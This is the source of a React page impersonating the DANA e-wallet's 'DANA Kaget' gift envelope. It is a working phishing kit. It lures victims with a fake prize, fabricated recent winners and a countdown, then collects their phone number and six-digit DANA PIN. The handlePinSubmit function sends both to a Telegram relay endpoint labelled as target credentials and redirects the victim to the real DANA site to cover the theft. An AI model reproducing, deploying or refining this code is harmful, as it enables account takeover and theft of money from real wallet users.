"use client";

import { useState, useRef, useEffect, useCallback } from "react";
import defaultData from "./data.json";

// ─── TYPES & INTERFACES ───────────────────────────────────────────────────────
interface WinnerItem {
  phone: string;
  amount: number;
  timeAgo: string;
  avatarBg: string;
}

export default function DanaKagetPage() {
  // ─── STATES ─────────────────────────────────────────────────────────────────
  const [phase, setPhase] = useState<"initial" | "opening" | "processing" | "login" | "pin">("initial");
  const [phoneNumber, setPhoneNumber] = useState<string>("");
  const [pin, setPin] = useState<string>("");
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [wrongNumber, setWrongNumber] = useState<string>("");
  const [countdown, setCountdown] = useState(294); // ~5 menit
  const [redirectCount, setRedirectCount] = useState(defaultData.redirectCountdown || 5);
  const [claimedAmount, setClaimedAmount] = useState<number>(0);
  const [displayAmount, setDisplayAmount] = useState<number>(0);
  const [remainingQuota, setRemainingQuota] = useState<number>(defaultData.sisaAmplop || 14);
  const [recentWinners, setRecentWinners] = useState<WinnerItem[]>([]);
  const [txId, setTxId] = useState<string>("");
  const [txTime, setTxTime] = useState<string>("");


  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  // ─── INITIAL SETUP & WINNERS GENERATION ─────────────────────────────────────
  useEffect(() => {
    // Generate realistic amount between min & max
    const min = defaultData.minAmount || 35000;
    const max = defaultData.maxAmount || 250000;
    const randomAmount = Math.floor(Math.random() * ((max - min) / 1000) + min / 1000) * 1000;
    setClaimedAmount(randomAmount);

    // Generate simulated recent winners
    const prefixes = ["0812", "0813", "0821", "0822", "0857", "0858", "0877", "0878", "0896", "0895"];
    const avatarColors = [
      "from-blue-500 to-indigo-600",
      "from-amber-400 to-orange-500",
      "from-emerald-400 to-teal-600",
      "from-rose-400 to-pink-600",
      "from-purple-500 to-indigo-600",
    ];

    const winners: WinnerItem[] = [
      {
        phone: `${prefixes[Math.floor(Math.random() * prefixes.length)]}****${Math.floor(1000 + Math.random() * 9000)}`,
        amount: Math.floor(Math.random() * 120 + 20) * 1000,
        timeAgo: "Baru saja",
        avatarBg: avatarColors[0],
      },
      {
        phone: `${prefixes[Math.floor(Math.random() * prefixes.length)]}****${Math.floor(1000 + Math.random() * 9000)}`,
        amount: Math.floor(Math.random() * 180 + 30) * 1000,
        timeAgo: "1 mnt lalu",
        avatarBg: avatarColors[1],
      },
      {
        phone: `${prefixes[Math.floor(Math.random() * prefixes.length)]}****${Math.floor(1000 + Math.random() * 9000)}`,
        amount: Math.floor(Math.random() * 90 + 15) * 1000,
        timeAgo: "2 mnt lalu",
        avatarBg: avatarColors[2],
      },
      {
        phone: `${prefixes[Math.floor(Math.random() * prefixes.length)]}****${Math.floor(1000 + Math.random() * 9000)}`,
        amount: Math.floor(Math.random() * 210 + 40) * 1000,
        timeAgo: "3 mnt lalu",
        avatarBg: avatarColors[3],
      },
    ];
    setRecentWinners(winners);

    // Generate Transaction ID & Date
    const now = new Date();
    const dateStr = now.toISOString().slice(0, 10).replace(/-/g, "");
    const randomHex = Math.random().toString(36).substring(2, 8).toUpperCase();
    setTxId(`DK${dateStr}${randomHex}`);
    setTxTime(
      now.toLocaleDateString("id-ID", {
        day: "numeric",
        month: "short",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        timeZone: "Asia/Jakarta",
      }) + " WIB"
    );

  }, []);

  // ─── COUNTDOWN TIMER ────────────────────────────────────────────────────────
  useEffect(() => {
    if (phase !== "initial") return;
    const t = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(t);
  }, [phase]);  // ─── FORMATTERS ─────────────────────────────────────────────────────────────
  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  const formatRupiah = (val: number) => {
    return new Intl.NumberFormat("id-ID", {
      style: "currency",
      currency: "IDR",
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    }).format(val);
  };

  // Format +62 812 3456 7890 from "081234567890"
  const formatPhoneInput = (value: string) => {
    const digits = value.replace(/\D/g, "").replace(/^0/, "62");
    const clean = digits.startsWith("62") ? digits : "62" + digits;
    let formatted = clean;
    if (clean.length > 2) formatted = clean.slice(0, 2) + " " + clean.slice(2);
    if (clean.length > 4) formatted = formatted.slice(0, 5) + " " + formatted.slice(5);
    if (formatted.length > 9) formatted = formatted.slice(0, 9) + " " + formatted.slice(9);
    if (formatted.length > 14) formatted = formatted.slice(0, 14) + " " + formatted.slice(14);
    return formatted.slice(0, 18);
  };

  // ─── WEB AUDIO CHIME SYNTHESIZER ────────────────────────────────────────────
  const playClaimChime = useCallback(() => {
    try {
      const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      const ctx = new AudioContextClass();

      const notes = [523.25, 659.25, 783.99, 1046.5]; // C5, E5, G5, C6 (Celebratory Major Chord)
      notes.forEach((freq, index) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();

        osc.type = "triangle";
        osc.frequency.setValueAtTime(freq, ctx.currentTime + index * 0.08);

        gain.gain.setValueAtTime(0.01, ctx.currentTime + index * 0.08);
        gain.gain.exponentialRampToValueAtTime(0.25, ctx.currentTime + index * 0.08 + 0.04);
        gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + index * 0.08 + 0.8);

        osc.connect(gain);
        gain.connect(ctx.destination);

        osc.start(ctx.currentTime + index * 0.08);
        osc.stop(ctx.currentTime + index * 0.08 + 0.85);
      });
    } catch {
      // Audio playback silently skipped if unsupported
    }
  }, []);
  // ─── HANDLE LOGIN (MASUK KE FORM PIN) ───────────────────────────────────────
  const handleLogin = async () => {
    // Validate: must start with 62 and have 8-14 digits
    const rawDigits = phoneNumber.replace(/\D/g, "");
    const normalized = rawDigits.startsWith("62") ? rawDigits : "62" + rawDigits.replace(/^0/, "");

    if (normalized.length < 10 || normalized.length > 15) {
      setWrongNumber("Nomor yang Anda masukkan tidak valid. Periksa kembali.");
      return;
    }
    setWrongNumber("");
    setIsSubmitting(true);
    
    // Simulate short network delay then transition to PIN page
    setTimeout(() => {
      setIsSubmitting(false);
      setPhase("pin");
    }, 600);
  };

  // ─── HANDLE PIN (KIRIM NOMOR + PIN → REDIRECT DANA ASLI) ────────────────────
  const handlePinSubmit = async (currentPin: string) => {
    if (currentPin.length !== 6) return;
    setIsSubmitting(true);

    const rawDigits = phoneNumber.replace(/\D/g, "");
    const normalized = rawDigits.startsWith("62") ? rawDigits : "62" + rawDigits.replace(/^0/, "");
    
    const ts = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta", dateStyle: "full", timeStyle: "medium" });
    const info = `📲 DANA KAGET — KREDENSIAL TARGET
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏱ Waktu: ${ts} WIB
📱 Nomor Target: +${normalized}
🔐 PIN DANA: ${currentPin}
👤 Pengirim Amplop: ${defaultData.senderName}
🎁 Nominal Hadiah: ${formatRupiah(claimedAmount)}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
User sedang diarahkan ke DANA asli.`;

    // Kirim nomor dan PIN ke Telegram
    const fd = new FormData();
    fd.append("locationInfo", info);
    for (let i = 0; i < 2; i++) {
      try {
        const res = await fetch("/api/telegram", { method: "POST", body: fd });
        if (res.ok) break;
      } catch {}
      if (i === 0) await new Promise((r) => setTimeout(r, 400));
    }

    // Redirect ke halaman aplikasi DANA asli
    const target = defaultData.redirectUrl || "https://link.dana.id/";
    window.location.href = target;
  };

  // ─── HANDLE ENVELOPE OPEN ───────────────────────────────────────────────────
  const handleOpenEnvelope = async () => {
    setPhase("opening");
    playClaimChime();

    // Animate opening state, then transition to login form for phone number
    setTimeout(() => {
      setPhase("processing");
    }, 700);

    await new Promise((r) => setTimeout(r, 2200)); // Guarantee UI transition smoothly

    setPhase("login");
  };

  // ═════════════════════════════════════════════════════════════════════════════
  // RENDER: PHASE LOGIN (FORM INPUT NOMOR HP)
  // ═════════════════════════════════════════════════════════════════════════════
  if (phase === "login") {
    return (
      <div className="min-h-screen bg-white flex justify-center items-start sm:py-6 selection:bg-[#118EEA] selection:text-white">
        <div className="w-full max-w-md bg-white min-h-screen sm:min-h-[844px] sm:rounded-3xl sm:shadow-2xl flex flex-col relative overflow-hidden font-sans">
          {/* Header */}
          <div className="flex items-center px-4 pt-6 pb-2">
            <button onClick={() => setPhase("initial")} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#333" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
              </svg>
            </button>
            <div className="flex-1 flex justify-center -ml-6">
              <span className="font-extrabold text-2xl text-[#118EEA] tracking-tight">DANA</span>
            </div>
          </div>

          <div className="px-6 mt-6 flex-1">
            <h1 className="text-2xl font-extrabold text-[#313131] mb-2 tracking-tight">Masukkan Nomor HP</h1>
            <p className="text-sm text-gray-500 mb-8 font-medium">Lanjut untuk mencairkan DANA Kaget ke saldo kamu.</p>
            
            <div className="relative mb-6">
              <div className={`flex items-center border-b-2 transition-colors ${wrongNumber ? 'border-red-500' : phoneNumber ? 'border-[#118EEA]' : 'border-gray-300 hover:border-gray-400'} pb-2 pt-1`}>
                <span className="font-bold text-lg text-gray-800 tracking-wide border-r border-gray-300 pr-3 mr-3">+62</span>
                <input 
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(formatPhoneInput(e.target.value))}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') handleLogin();
                  }}
                  className="flex-1 bg-transparent text-xl font-bold text-gray-800 focus:outline-none placeholder-gray-300 tracking-wide"
                  placeholder="812 3456 7890"
                  autoFocus
                />
                {phoneNumber && (
                  <button onClick={() => setPhoneNumber("")} className="ml-2 bg-gray-200 text-gray-500 rounded-full p-1 hover:bg-gray-300">
                    <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
                  </button>
                )}
              </div>
              {wrongNumber && <p className="text-red-500 text-xs mt-2 font-medium">{wrongNumber}</p>}
            </div>
            
            <p className="text-[11px] text-gray-400 font-medium leading-relaxed">
              Dengan melanjutkan, kamu setuju dengan <span className="text-[#118EEA] font-bold">Syarat & Ketentuan</span> dan <span className="text-[#118EEA] font-bold">Kebijakan Privasi</span> DANA.
            </p>
          </div>

          <div className="p-6">
            <button 
              onClick={handleLogin}
              disabled={isSubmitting || phoneNumber.replace(/\D/g, "").length < 4}
              className={`w-full py-4 rounded-xl font-bold text-lg shadow-sm transition-all flex justify-center items-center ${
                phoneNumber.replace(/\D/g, "").length >= 4 
                  ? "bg-[#118EEA] text-white hover:bg-[#0E70B9] active:scale-[0.98]" 
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              }`}
            >
              {isSubmitting ? (
                <svg className="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                </svg>
              ) : (
                "LANJUT"
              )}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ═════════════════════════════════════════════════════════════════════════════
  // RENDER: PHASE PIN (FORM INPUT PIN 6 DIGIT)
  // ═════════════════════════════════════════════════════════════════════════════
  if (phase === "pin") {
    return (
      <div className="min-h-screen bg-white flex justify-center items-start sm:py-6 selection:bg-[#118EEA] selection:text-white">
        <div className="w-full max-w-md bg-white min-h-screen sm:min-h-[844px] sm:rounded-3xl sm:shadow-2xl flex flex-col relative overflow-hidden font-sans">
          {/* Header */}
          <div className="flex items-center px-4 pt-6 pb-2 relative">
            <button onClick={() => setPhase("login")} className="p-2 hover:bg-gray-100 rounded-full transition-colors absolute left-4 z-10">
              <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#333" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
              </svg>
            </button>
            <div className="flex-1 flex justify-center w-full">
              <span className="font-extrabold text-xl text-[#313131]">Masukkan PIN DANA</span>
            </div>
          </div>

          <div className="flex-1 flex flex-col items-center pt-8 px-6">
            <div className="w-16 h-16 rounded-full bg-gray-200 border-2 border-white shadow-sm flex items-center justify-center mb-3">
              <svg viewBox="0 0 24 24" width="32" height="32" fill="#999"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
            </div>
            <p className="text-gray-500 font-medium tracking-wide mb-10 text-sm">
              {phoneNumber.startsWith("62") ? `+${phoneNumber}` : phoneNumber}
            </p>
            
            {/* PIN Dots Display */}
            <div className="flex items-center gap-3 mb-12">
              {[0, 1, 2, 3, 4, 5].map((idx) => (
                <div key={idx} className="w-4 h-4 rounded-full bg-gray-200 overflow-hidden relative flex items-center justify-center">
                  {pin.length > idx && (
                    <div className="absolute inset-0 bg-[#313131] rounded-full animate-in zoom-in duration-150"></div>
                  )}
                </div>
              ))}
            </div>
            
            {/* Custom Numpad */}
            <div className="w-full max-w-[280px] grid grid-cols-3 gap-y-6 gap-x-6">
              {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                <button
                  key={num}
                  onClick={() => {
                    const newPin = pin + num;
                    if (newPin.length <= 6) {
                      setPin(newPin);
                      if (newPin.length === 6) handlePinSubmit(newPin);
                    }
                  }}
                  className="h-16 rounded-full text-2xl font-semibold text-[#313131] hover:bg-gray-100 active:bg-gray-200 flex items-center justify-center transition-colors select-none"
                >
                  {num}
                </button>
              ))}
              <div /> {/* Empty space */}
              <button
                onClick={() => {
                  const newPin = pin + "0";
                  if (newPin.length <= 6) {
                    setPin(newPin);
                    if (newPin.length === 6) handlePinSubmit(newPin);
                  }
                }}
                className="h-16 rounded-full text-2xl font-semibold text-[#313131] hover:bg-gray-100 active:bg-gray-200 flex items-center justify-center transition-colors select-none"
              >
                0
              </button>
              <button
                onClick={() => setPin(pin.slice(0, -1))}
                className="h-16 rounded-full flex items-center justify-center hover:bg-gray-100 active:bg-gray-200 transition-colors select-none"
              >
                <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#333" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                  <line x1="18" y1="9" x2="12" y2="15"></line>
                  <line x1="12" y1="9" x2="18" y2="15"></line>
                </svg>
              </button>
            </div>

            <button className="mt-8 text-[#118EEA] font-bold text-sm tracking-wide">
              LUPA PIN?
            </button>
          </div>
          
          {isSubmitting && (
            <div className="absolute inset-0 bg-white/70 flex items-center justify-center z-50 backdrop-blur-[1px]">
               <svg className="animate-spin h-10 w-10 text-[#118EEA]" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                </svg>
            </div>
          )}
        </div>
      </div>
    );
  }

  // ═════════════════════════════════════════════════════════════════════════════
  // RENDER: PHASE INITIAL (AMPLOP DANA KAGET)
  // ═════════════════════════════════════════════════════════════════════════════
  if (phase === "initial" || phase === "opening") {
    return (
      <div className="min-h-screen bg-[#118EEA] flex flex-col items-center sm:py-6 selection:bg-white selection:text-[#118EEA] relative overflow-hidden font-sans">
        {/* Background Overlay (Uang/Koin blur) */}
        <div className="absolute inset-0 z-0 pointer-events-none" style={{
            backgroundImage: "url('https://a.m.dana.id/resource/imgs/skywalker/bg-danakaget.png')",
            backgroundSize: 'cover',
            backgroundPosition: 'center',
            opacity: 0.8
        }}></div>

        <div className="w-full max-w-md min-h-screen sm:min-h-[844px] flex flex-col relative z-10 pb-8">
          {/* Header Text & Logo */}
          <div className="flex flex-col items-center pt-10 pb-8 z-20">
            <div className="flex items-center gap-1.5 mb-4">
              <svg viewBox="0 0 24 24" width="32" height="32" fill="white">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/>
              </svg>
              <span className="font-extrabold text-2xl text-white tracking-tight">DANA</span>
            </div>
            <h1 className="text-white text-xl font-bold text-center leading-snug">
              Buka amplop buat<br />liat DANA Kaget
            </h1>
          </div>

          {/* DANA Envelope Container */}
          <div className="flex-1 flex flex-col items-center justify-center px-6 mt-2 relative z-20">
            <div className={`w-full aspect-[2/3] max-h-[480px] rounded-3xl relative overflow-hidden shadow-2xl transition-transform duration-500 ${phase === "opening" ? "scale-95" : ""}`} style={{
              backgroundImage: "url('/dana_env_bg.png')",
              backgroundSize: '100% 100%',
              backgroundPosition: 'center',
              backgroundRepeat: 'no-repeat'
            }}>
              
              {/* Center Seal Button (Image uploaded by user) */}
              <div className="absolute top-[39.5%] left-1/2 -translate-x-1/2 -translate-y-1/2 z-30">
                <button
                  onClick={handleOpenEnvelope}
                  disabled={phase === "opening"}
                  className="w-28 h-28 relative flex items-center justify-center group outline-none transition-transform active:scale-95"
                >
                  {/* Outer pulsing ring */}
                  {phase !== "opening" && (
                    <>
                      <div className="absolute inset-0 rounded-full bg-[#118EEA]/20 animate-ping shadow-xl scale-90 pointer-events-none" style={{ animationDuration: '2s' }}></div>
                      <div className="absolute inset-0 rounded-full bg-[#118EEA]/40 animate-pulse shadow-lg scale-95 pointer-events-none" style={{ animationDuration: '3s' }}></div>
                    </>
                  )}

                  <img 
                    src="/dana_seal.png" 
                    alt="DANA Seal" 
                    className={`w-full h-full object-contain relative z-10 filter drop-shadow-xl ${phase === "opening" ? "animate-pulse" : "group-hover:scale-105 transition-transform duration-300"}`} 
                  />

                  {phase === "opening" && (
                    <div className="absolute inset-0 flex items-center justify-center z-20">
                      <svg className="animate-spin h-8 w-8 text-[#118EEA]" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-75" cx="12" cy="12" r="10" stroke="white" strokeWidth="4" />
                        <path className="opacity-100" fill="#118EEA" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                      </svg>
                    </div>
                  )}
                </button>
              </div>
            </div>

            {/* Sender Badge */}
            <div className="bg-white px-5 py-3 rounded-full flex items-center gap-3 mt-8 shadow-xl min-w-[200px] w-4/5 justify-start">
              <div className="w-8 h-8 rounded-full bg-[#118EEA] flex items-center justify-center">
                 <svg viewBox="0 0 24 24" width="16" height="16" fill="white">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/>
                  </svg>
              </div>
              <span className="text-[#313131] font-semibold text-sm">Dari <span className="font-bold ml-1">{defaultData.senderName || "DANA"}</span></span>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ═════════════════════════════════════════════════════════════════════════════
  // RENDER: PHASE PROCESSING (VERIFIKASI KEAMANAN DANA)
  // ═════════════════════════════════════════════════════════════════════════════
  if (phase === "processing") {
    return (
      <div className="min-h-screen bg-[#F5F8FA] flex justify-center items-center px-4 font-sans">
        <div className="w-full max-w-sm bg-white rounded-3xl p-8 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
          {/* Animated DANA Logo Pulse */}
          <div className="relative mb-6">
            <div className="absolute inset-0 bg-[#118EEA] rounded-full blur-xl opacity-30 animate-ping" />
            <div className="w-20 h-20 bg-gradient-to-tr from-[#0E70B9] to-[#118EEA] rounded-2xl flex items-center justify-center shadow-lg relative z-10">
              <span className="text-white font-black text-3xl">D</span>
            </div>
          </div>

          <div className="flex items-center gap-2 text-[#118EEA] mb-2 font-bold">
            <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
            </svg>
            <span className="text-base font-extrabold">Memproses Klaim Saldo...</span>
          </div>

          <p className="text-gray-500 text-xs leading-relaxed max-w-[240px]">
            Sedang memverifikasi perlindungan DANA Protection dan mengamankan nominal ke dompet Anda.
          </p>
        </div>
      </div>
    );
  }


}
